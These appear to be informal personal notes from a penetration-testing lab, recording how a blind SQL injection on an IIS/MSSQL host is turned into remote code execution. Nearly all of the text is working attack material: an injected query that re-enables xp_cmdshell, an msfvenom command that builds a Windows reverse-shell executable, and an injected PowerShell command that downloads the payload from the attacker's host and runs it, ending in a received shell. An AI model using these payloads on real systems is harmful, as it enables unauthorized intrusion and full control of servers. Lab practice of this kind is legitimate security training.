Found my old notes and can continue, want to learn the newer concepts. Actuall first, lets figure out how I would know the system using this injections.. From the new research I have not found to OS of this box

Well, breezing thru the old notes, just seeing the fact that it is an Microsoft IIS should be enough to google and find something along the lines of enable remote code execution.

Now I see I arrived here by researching how to exploint the blind injection founnd [[SLQ Injection found]]. To enable the xp_command shell needs to be renabled as shown [[#Injection]]


# injection
Enabeling xp_cmdshell
```sql
1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
```

Generate rev shell payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.228 LPORT=4444 -f exe > reverse121.exe

```

Starting web server on host
```bash
' EXECUTE xp_cmdshell 'powershell.exe Invoke-WebRequest "http://192.168.45.228:8888/reverse.exe" -OutFile "C:\Users\Public\Downloads\reverse.exe";C:\Users\Public\Downloads\reverse.exe'--
```

Shell recived on to [[121 Priv esc]]
